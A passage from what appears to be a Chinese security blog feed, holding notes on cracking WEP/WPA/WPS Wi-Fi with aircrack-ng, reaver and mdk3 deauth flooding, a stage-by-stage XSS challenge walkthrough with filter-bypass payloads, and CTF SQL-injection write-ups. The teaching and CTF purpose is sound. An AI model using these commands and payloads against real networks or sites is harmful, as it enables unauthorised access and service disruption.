class="code"><pre><span class="line">aircrack-ng    破解WEP,以及WPA(字典攻击)密钥  </span><br><span class="line">airdecap-ng    通过已经知道密钥来解密WEP或WPA嗅探数据  </span><br><span class="line">airmon-ng      将网卡设定为监听模式 </span><br><span class="line">aireplay-ng    数据包注入工具</span><br><span class="line">airodump-ng    数据包嗅探，将无线网络数据输送到PCAP或IVS文件并显示网络信息</span><br><span class="line">airtun-ng      创建虚拟管道 </span><br><span class="line">airolib-ng     保存、管理ESSID密码列表 </span><br><span class="line">packetforge-ng  创建数据包注入用的加密包 </span><br><span class="line">Tools          混合、转换工具</span><br><span class="line">airbase-ng    软件模拟AP</span><br><span class="line">airdecloak-ng 消除pcap文件中的WEP加密包 </span><br><span class="line">airdriver-ng  无线设备驱动管理工具 </span><br><span class="line">airolib-ng    保存、管理ESSID密码列表、计算对应的密钥 </span><br><span class="line">airserv-ng    允许不同的进程访问无线网卡</span><br><span class="line">buddy-ng     easside-ng文件的描述</span><br><span class="line">esside-ng    和AP接入点通信（无WEP）</span><br><span class="line">tkiptun-ng   WPS/TKIP攻击 </span><br><span class="line">wesside-ng   自动破解WEP密钥</span><br></pre></td></tr></table></figure></p><p>4<br>1）将无线网卡启动监听模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start interface[channel] 启动监听模式</span><br><span class="line">airmon-ng stop interface[channel] 关闭监听模式</span><br></pre></td></tr></table></figure></p><p>2）将网卡设置为混杂模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>3）扫描网络范围   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng [选项] wlan0mon</span><br><span class="line">-c   指定目标AP的工作信道</span><br><span class="line">-i,-ivs  仅保存可用于破解的IVS数据报文 </span><br><span class="line">-w  指定一个自己希望保存的文件名，用来保存有效的IVS数据报文</span><br></pre></td></tr></table></figure><p>参数解读<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BSSID 表示无线AP的mac地址 </span><br><span class="line">PWR   网卡报告的信号水平，它主要取决于驱动。AP离计算机，信号越高。如果部分客户端的PWR为-1，那么说明该客户端不在当前网卡能监听到的范围内，但是能捕获到AP发往客户端的数据。如果所有的客户端PWR值都为-1，那么说明网卡驱动不支持信号水平报告。    </span><br><span class="line">Beasons   无线AP 发出的编号，每个AP在最低速率（1M）时差不多每秒会发送10个左右的beacon。    </span><br><span class="line"><span class="comment">#Data  被捕捉到的数据分组分量  </span></span><br><span class="line"><span class="comment">#/s    过去10秒内每秒捕获数据分组的数量  </span></span><br><span class="line">CH     信道号</span><br><span class="line">MB     无线AP所支持的最大速率  </span><br><span class="line">ENC    使用的几码算法体系。OPN表示无加密，WEP？表示wep或者wpa/wpa2  </span><br><span class="line">CIPHER 检测到的加密算法  </span><br><span class="line">AUTH   使用认证协议 常用的有MGT(WPS/WPA2使用独立的认证服务器，平时我们常说的802.1x、radius、eap等),SKA（WEP的共享密钥），PSK(WPA/WPA2的预共享密钥) 或者OPN(WEP开放式）     </span><br><span class="line">ESSID   也就是所谓的SSID号   </span><br><span class="line">STATION 客户端的mac地址 </span><br><span class="line">Rate    输出速率 </span><br><span class="line">Lost    在过去10秒内丢失的数据分组，基于序列号检测。  </span><br><span class="line">Frames  客户端发送的数据分组数量  </span><br><span class="line">Probe    v被客户端查探的ESSID.</span><br></pre></td></tr></table></figure></p><p>5<br>强制客户端下线<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mdk3 interface mode options </span><br><span class="line">mode： 指定测试模式。  </span><br><span class="line">a   dos模式  </span><br><span class="line">b   beacon洪水模式 </span><br><span class="line">d   解除验证/解除关联暴力模式   </span><br><span class="line">f   mac过滤暴力模式  </span><br><span class="line">g   wpa 降级测试  </span><br><span class="line">m   关闭开发  </span><br><span class="line">p   基本探测和ESSID暴力模式</span><br><span class="line">w   WIDS/WIPS混乱  </span><br><span class="line">x   802.1测试</span><br></pre></td></tr></table></figure></p><p>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mdk3 mon0 d -s 120 0 -c 1,6,11</span><br></pre></td></tr></table></figure></p><h1 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h1><p>1.过滤<br>比较运算符<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eq     ==</span><br><span class="line">ne     !=</span><br><span class="line">gt     &gt;</span><br><span class="line">lt     &lt;</span><br><span class="line">ge     &gt;=v</span><br><span class="line">le     &lt;=</span><br></pre></td></tr></table></figure></p><p>1)ip过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip.addr==ip   </span><br><span class="line">ip.src_host==ip  显示来源ip </span><br><span class="line">ip.dst_host==ip  显示目标ip</span><br></pre></td></tr></table></figure></p><p>2)端口过滤   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcp.port </span><br><span class="line">tcp.dstport==80</span><br><span class="line">tcp.srcport==80</span><br></pre></td></tr></table></figure><p>3)协议过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">udp arp icmp http smtp ftp dns msnms ip ssl 等  </span><br><span class="line">排除udp  !udp或者not udp</span><br></pre></td></tr></table></figure></p><p>4)包长度过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">udp.length==26  udp本身固定长度8加上udp下面那块数据包之和</span><br><span class="line">tcp.len&gt;=7      表示ip数据包(tcp下面那块数据）不包括tcp本身  </span><br><span class="line">ip.len==94      除了以太网头固定长度14，其他都是ip.len,即从ip本身到最后  </span><br><span class="line">frame.len==119   表示整个数据包长度，从eth开始到最后</span><br></pre></td></tr></table></figure></p><p>5)http模式过滤<br>指定get包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.request.method==<span class="string">"GET"</span> &amp;&amp; http contains <span class="string">"host"</span></span><br><span class="line">http.request.method==<span class="string">"GET"</span> &amp;&amp; http contains <span class="string">"User-Agent"</span></span><br></pre></td></tr></table></figure></p><p>指定post包 如上<br>指定响应包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http contains <span class="string">"HTTP/1.1 200 OK"</span> &amp;&amp; http contains <span class="string">"Content-Type:"</span></span><br></pre></td></tr></table></figure></p><p>6)表达式  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!(arp.src==192.168.1.1) and !(arp.dst.proto_ipv4==192.168.1.11</span><br></pre></td></tr></table></figure><p>2.802.11数据结构<br>无线数据包和有限数据包的主要不同在于额外的802.11头部。这是一个第二层的头部，包含与数据包和传输介质有关的额外信息。<br>802.11数据包的三种类型：管理帧、控制帧、数据帧<br>分析特定的包类型<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wc.fc.type_subtype</span><br></pre></td></tr></table></figure></p><p>分析特定频率的包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">radiotap.channel.freq</span><br><span class="line"></span><br><span class="line">信道     中心频率 </span><br><span class="line">1        2412</span><br><span class="line">2        2317</span><br><span class="line">13       2472</span><br></pre></td></tr></table></figure></p><p>3.wep认证包<br>4.wpa认证包<br>5.RSSI 显示捕获数据包的射频信号强度<br> TX Rate 显示捕获数据包的数据率<br> Frequency/Channel 显示捕获数据包的频率和信道<br>6 qq使用ociq协议   </p><h1 id="WPS加密"><a href="#WPS加密" class="headerlink" title="WPS加密"></a>WPS加密</h1><p>1.wps支持两种模式：个人识别码模式和按钮模式<br>2.wps在某些设备上也是QQS<br>3.reaver是一个暴力破解wps加密的工具<br>将无线网卡设置为监听模式<br>例子：已知PIN码是12345678<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i mon0 -b ap的mac地址 -p 12345678</span><br></pre></td></tr></table></figure></p><p>不知时，暴力破解<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i mon0 -b ap的mac地址 -vv</span><br></pre></td></tr></table></figure></p><p>4.wifite是一款自动化wep和wpa破解工具<br>启动WiFite<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifite -pps 660</span><br></pre></td></tr></table></figure></p><p>ctrl +c 停止扫描<br>选择ap编号<br>5.fern wifr cracker 可以破解并恢复wep、wpa和wps的无线网络密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fern-wifi-cracker</span><br></pre></td></tr></table></figure></p><h1 id="WEP加密模式"><a href="#WEP加密模式" class="headerlink" title="WEP加密模式"></a>WEP加密模式</h1><p><img src="http://p4gdp8beq.bkt.clouddn.com/1asdfasdfsd.png" alt=""><br>1.wpd加密认证类型：<br>开放系统认证<br>共享密钥认证<br>2.Aircrack-ng工具主要是用于网络侦测、数据包嗅探以及wep和wpa/wpa2-pskf破解。<br>1)查看系统中的无限网路接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure></p><p>2)将该无线网卡设置为监听模式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start mon0</span><br></pre></td></tr></table></figure></p><p>3)扫描附近的wifi网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon0</span><br></pre></td></tr></table></figure></p><p>4)选择wep模式加密的目标,捕获数据包，生成wireless-o1.ivs文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng --ivs -w wireless --bssid ap的mac  -c 6 wlan0mon </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--ivs     设置过滤，保存可用于破解的ivs包 </span><br><span class="line">-w        指定捕获数据包要保存的文件名  </span><br><span class="line">--bssid   来指定攻击目标的BSSID </span><br><span class="line">-c        指定攻击目标ap的工作频道</span><br></pre></td></tr></table></figure></p><p>5）捕获一定的数据包后，开始进行破解<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng wireless-01.ivs</span><br></pre></td></tr></table></figure></p><p>3.wifite工具，进行破解 </p><h1 id="WPA加密模式"><a href="#WPA加密模式" class="headerlink" title="WPA加密模式"></a>WPA加密模式</h1><p>1.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 6 abcdef -o password.txt</span><br></pre></td></tr></table></figure></p><p>2.pwgen工具可以说横溢难以忘记的随机密码或容易记住的密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwgen -1 -y</span><br></pre></td></tr></table></figure></p><p>3.RainbowCrack创建彩虹表<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtgen 彩虹表生成工具，生成口令、散列值对照表 </span><br><span class="line">rtsort 排序彩虹表，为rcrack提供输入  </span><br><span class="line">rcrack  使用排好序的彩虹表进行口令破解</span><br></pre></td></tr></table></figure></p><p>例子：<br>1)创建一个md5算法加密的彩虹表,文件保存在/usr/share/rainbowcrack下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtgen md5 numeric 5 5 0 100 200 0</span><br></pre></td></tr></table></figure></p><p>2）对生成的彩虹表进行排序 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rtsort md5_numeric<span class="comment">#5-5_0_100x200_0.rt</span></span><br></pre></td></tr></table></figure><p>3)破解哈希值md5(11111)= b0baee9d279d34fa1dfd71aadb908c3f<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rcrack  md5_numeric<span class="comment">#5-5_0_100x200_0.rt -h b0baee9d279d34fa1dfd71aadb908c3f</span></span><br></pre></td></tr></table></figure></p><p>4.Aircrack-ng工具破解<br>修改当前无线网卡的mac地址<br>1）查看本机无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure></p><p>2)停止无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng stop wlan0</span><br></pre></td></tr></table></figure></p><p>3)修改无线网卡的mac地址为00:11:22:33:44:55<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">macchanger --mac 00:11:22:33:44:55</span><br></pre></td></tr></table></figure></p><p>4)启用无线网络接口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arimon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>5)捕获数据包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>6)捕获test无线网络的数据包，成功捕获握手包后，生成的文件名为wpa-01.cap<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 1 -w wpa -bssid 目标ap的mac  wlan0mon`</span><br></pre></td></tr></table></figure></p><p>如果一直没有捕获到握手包 可以使用aireplay-ng命令进行Deauth攻击，强制客户端重新连接到wifi网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon</span><br></pre></td></tr></table></figure></p><p>7)Deauth攻击<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon</span><br></pre></td></tr></table></figure></p><p>8）破解密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w dic 捕获的<span class="built_in">cap</span>文件</span><br></pre></td></tr></table></figure></p><p>5.wifite<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifite -dict passowrd.txt</span><br></pre></td></tr></table></figure></p><h1 id="WPA-RADIUS加密模式"><a href="#WPA-RADIUS加密模式" class="headerlink" title="WPA+RADIUS加密模式"></a>WPA+RADIUS加密模式</h1><p> <br><br>  <br><br>   <br><br>    <br><br>    参考文章:<br>    <a href="http://www.tup.tsinghua.edu.cn/booksCenter/book_06720901.html" target="_blank" rel="noopener">http://www.tup.tsinghua.edu.cn/booksCenter/book_06720901.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="无线渗透" scheme="http://note.cfyqy.com/categories/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="无线渗透" scheme="http://note.cfyqy.com/tags/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>xss闯关小游戏</title>
    <link href="http://note.cfyqy.com/posts/c617af63.html"/>
    <id>http://note.cfyqy.com/posts/c617af63.html</id>
    <published>2018-04-01T14:10:00.000Z</published>
    <updated>2018-09-18T09:47:49.419Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>附上网址 <a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br><a id="more"></a></p><h1 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h1><p>没有过滤直接输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h1><p>闭合双引号，闭合标签。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain)&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h1><p>用bp抓一下包，第一个参数过滤了，第二个没有。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p1=123p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h1><p>第三个参数没有过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackme<span class="string">"&gt; &lt;script&gt; alert(document.doamin);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h1><p>首先要修改输入框的长度限制<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;a&gt;&quot;</span><br></pre></td></tr></table></figure></p><h1 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h1><p><a href="https://xss-quiz.int21h.jp/stage-no6.php?sid=cfb6f830797a064bcb4fa49f267c45b783a54cf8" target="_blank" rel="noopener">链接</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onmousemove=&quot;alert(document.domain)</span><br></pre></td></tr></table></figure></p><h1 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h1><p><a href="https://xss-quiz.int21h.jp/stage07.php?sid=e3c936027d379ae81427c1c2491f250cf0f2adbb" target="_blank" rel="noopener">链接</a><br>这里的”&lt;&gt;都被转义了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=alert(document.domain)</span><br></pre></td></tr></table></figure></p><h1 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h1><p><a href="https://xss-quiz.int21h.jp/stage008.php?sid=6da116e012a56c3c8d01d78458b950e14112c5d2" target="_blank" rel="noopener">链接</a><br>伪协议:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></p><h1 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h1><p><a href="https://xss-quiz.int21h.jp/stage_09.php?sid=cfb2b50189fb16e0c854ec317c5caa044ab15912" target="_blank" rel="noopener">链接</a><br>“&lt;&gt;都被转义了，当然也不能用onmouseover和onclick，根据提示，用UTF-7编码解码工具，将” onmousemove=”alert(document.domain)转为UTF-7编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7</span><br></pre></td></tr></table></figure></p><p>这个对使用的IE浏览器有一定的限制，大部分浏览器都已经修复了这个漏洞，但IE7还没有<br> 因为没有IE7，所以这里直接用firebox直接弹框</p><h1 id="stage-10"><a href="#stage-10" class="headerlink" title="stage 10"></a>stage 10</h1><p><a href="https://xss-quiz.int21h.jp/stage00010.php?sid=aec027ff9171a5004e62e1fa983d430d7fab2146" target="_blank" rel="noopener">链接</a><br> 查看源码知道过滤了domain<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.doadoaminmin)&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p><h1 id="stage-11"><a href="#stage-11" class="headerlink" title="stage 11"></a>stage 11</h1><p> <a href="https://xss-quiz.int21h.jp/stage11th.php?sid=2a265b5a2d78759fe2956ec2c95782e9cd89880f" target="_blank" rel="noopener">链接</a><br> hint:<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;s/script/xscript/ig;&quot; and &quot;s/on[a-z]+=/onxxx=/ig;&quot; and &quot;s/style=/stxxx=/ig;&quot;</span><br></pre></td></tr></table></figure></p><p> 过滤了挺多的<br> 1)插入&#09;不可见字符<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascri&amp;#09;pt:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p><p> 2)将javascript转化成unicode<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot;</span><br><span class="line">``` </span><br><span class="line"># stage 12 </span><br><span class="line">[链接](https://xss-quiz.int21h.jp/stage_no012.php?sid=65e080510facb2594e5a8632a3191081fc9bd4fc)    </span><br><span class="line">hint:</span><br></pre></td></tr></table></figure></p><p> “s/[\x00-\x20\&lt;>\”\’]//g;”<br> <code>`</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;附上网址 &lt;a href=&quot;https://xss-quiz.int21h.jp/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xss-quiz.int21h.jp/&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://note.cfyqy.com/categories/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/categories/ctf/web/"/>
    
    
      <category term="ctf" scheme="http://note.cfyqy.com/tags/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web题</title>
    <link href="http://note.cfyqy.com/posts/761c3e82.html"/>
    <id>http://note.cfyqy.com/posts/761c3e82.html</id>
    <published>2018-03-28T10:48:00.000Z</published>
    <updated>2018-04-15T14:51:02.706Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="keyword">function</span> sqliCheck(<span class="variable">$str</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_iv</span></span>()&#123;</span><br><span class="line"><span class="variable">$random_iv</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$random_iv</span>.=chr(rand(1,255));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> login(<span class="variable">$info</span>)&#123;</span><br><span class="line"><span class="variable">$iv</span> = get_random_iv();</span><br><span class="line"><span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">setcookie(<span class="string">"iv"</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">setcookie(<span class="string">"cipher"</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">show_homepage</span></span>()&#123;</span><br><span class="line">global <span class="variable">$link</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]) &amp;&amp; isset(<span class="variable">$_COOKIE</span>[<span class="string">'iv'</span>]))&#123;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]);</span><br><span class="line"><span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line"><span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) or die(<span class="string">"</span></span><br><span class="line"><span class="string">base64_decode('"</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">"') can't unserialize</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from users limit "</span>.<span class="variable">$info</span>[<span class="string">'id'</span>].<span class="string">",0"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0 or die(mysqli_error(<span class="variable">$link</span>)))&#123;</span><br><span class="line"><span class="variable">$rows</span>=mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!'</span>.<span class="variable">$rows</span>[<span class="string">'username'</span>].<span class="string">'</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">die(<span class="string">"ERROR!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span> = (string)<span class="variable">$_POST</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(sqliCheck(<span class="variable">$id</span>)) die(<span class="string">"</span></span><br><span class="line"><span class="string">sql inject detected!</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="variable">$info</span> = array(<span class="string">'id'</span>=&gt;<span class="variable">$id</span>);</span><br><span class="line">login(<span class="variable">$info</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Hello!</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>])&amp;&amp;isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">show_homepage();</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/block2016/p/5596676.html" target="_blank" rel="noopener">aes加密算法</a>   </p><h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>查看源码可得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">"'"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag is :'</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125; --&gt;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">可以下url连接，就大概猜到考什么了，做过两三次了， 直接提交 </span><br><span class="line">```bash</span><br><span class="line">ffifdyop</span><br></pre></td></tr></table></figure></p><h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>查看源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="variable">$sql</span>=<span class="string">"select * from users where username='<span class="variable">$username</span>' and password='<span class="variable">$password</span>'"</span>;  --&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="ctf" scheme="http://note.cfyqy.com/categories/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/categories/ctf/web/"/>
    
    
      <category term="ctf" scheme="http://note.cfyqy.com/tags/ctf/"/>
    
      <category term="web" scheme="http://note.cfyqy.com/tags/web/"/>
    
  </entry>
  
</feed>
